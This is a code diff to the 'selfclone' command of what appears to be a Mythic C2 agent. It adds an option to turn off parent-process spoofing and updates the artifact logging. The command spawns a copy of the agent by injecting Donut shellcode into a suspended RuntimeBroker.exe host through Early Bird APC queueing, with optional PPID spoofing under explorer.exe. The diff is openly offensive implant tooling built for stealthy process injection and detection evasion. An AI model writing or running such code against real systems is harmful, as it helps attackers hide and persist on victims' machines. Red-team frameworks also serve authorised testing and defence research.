@@ -15,16 +15,18 @@ class SelfCloneArguments(TaskArguments):
                 choices=["earlybird", "process"],
                 default_value="earlybird",
                 description=(
-                    "earlybird: CREATE_SUSPENDED host + PPID spoof + Donut shellcode via APC "
-                    "(no direct parent/child of the agent image). "
-                    "process: legacy CreateProcess of own EXE under spoofed PPID."
+                    "earlybird: CREATE_SUSPENDED host + Donut shellcode via APC (Early Bird). "
+                    "process: legacy CreateProcess of own EXE."
                 ),
             ),
             CommandParameter(
                 name="parent",
                 type=ParameterType.String,
                 default_value="explorer.exe",
-                description="Process name used as spoofed parent (PPID).",
+                description=(
+                    "PPID spoof target process name (e.g. explorer.exe). "
+                    "Use parent=self for no spoofing (new process is a real child of this agent)."
+                ),
             ),
             CommandParameter(
                 name="host",
@@ -61,14 +63,15 @@ class SelfCloneCommand(CommandBase):
     cmd = "selfclone"
     needs_admin = False
     help_cmd = (
-        "selfclone [-mode earlybird|process] [-parent explorer.exe] "
+        "selfclone [-mode earlybird|process] [-parent explorer.exe|self] "
         "[-host C:\\Windows\\System32\\RuntimeBroker.exe]"
     )
     description = (
-        "Spawn a new agent instance without a direct parent/child link to the current process. "
-        "Default mode earlybird: PPID-spoof a sacrificial host (CREATE_SUSPENDED), inject "
-        "Donut shellcode of this payload via NtQueueApcThread (Early Bird), then resume. "
-        "Mode process: legacy CreateProcess of the on-disk EXE under a spoofed PPID."
+        "Spawn a new agent instance. Default earlybird: CREATE_SUSPENDED sacrificial host, "
+        "inject Donut shellcode via NtQueueApcThread, resume. "
+        "parent=<name> spoofs PPID under that process; parent=self disables PPID spoofing "
+        "(host is a real child of this agent). "
+        "Mode process: legacy CreateProcess of the on-disk EXE."
     )
     version = 2
     supported_ui_features = []
@@ -88,8 +91,9 @@ class SelfCloneCommand(CommandBase):
         )
 
         mode = (taskData.args.get_arg("mode") or "earlybird").strip().lower()
-        parent = taskData.args.get_arg("parent") or "explorer.exe"
+        parent = (taskData.args.get_arg("parent") or "explorer.exe").strip()
         host = taskData.args.get_arg("host") or r"C:\Windows\System32\RuntimeBroker.exe"
+        no_spoof = parent.lower() == "self"
 
         taskData.args.add_arg("mode", mode)
         taskData.args.add_arg("parent", parent)
@@ -111,6 +115,7 @@ class SelfCloneCommand(CommandBase):
                     f"selfclone: failed to register shellcode with Mythic: {file_resp.Error}"
                 )
             taskData.args.add_arg("shellcode_file_id", file_resp.AgentFileId)
+            spoof_note = "no PPID spoof (parent=self)" if no_spoof else f"PPID spoof under {parent}"
             response.DisplayParams = (
                 f"mode=earlybird parent={parent} host={host} "
                 f"shellcode={len(shellcode)} bytes"
@@ -119,7 +124,7 @@ class SelfCloneCommand(CommandBase):
                 MythicRPCArtifactCreateMessage(
                     TaskID=taskData.Task.ID,
                     ArtifactMessage=(
-                        f"Early Bird: CreateProcess SUSPENDED under {parent}, "
+                        f"Early Bird: CreateProcess SUSPENDED, {spoof_note}, "
                         f"host={host}, QueueUserAPC shellcode"
                     ),
                     BaseArtifactType="Process Create",
@@ -128,10 +133,15 @@ class SelfCloneCommand(CommandBase):
         elif mode == "process":
             taskData.args.add_arg("shellcode_file_id", "")
             response.DisplayParams = f"mode=process parent={parent}"
+            artifact = (
+                "CreateProcessW without PPID spoof (parent=self)"
+                if no_spoof
+                else f"CreateProcessW with PPID spoof under {parent}"
+            )
             await SendMythicRPCArtifactCreate(
                 MythicRPCArtifactCreateMessage(
                     TaskID=taskData.Task.ID,
-                    ArtifactMessage=f"CreateProcessW with PPID spoof under {parent}",
+                    ArtifactMessage=artifact,
                     BaseArtifactType="Process Create",
                 )
             )
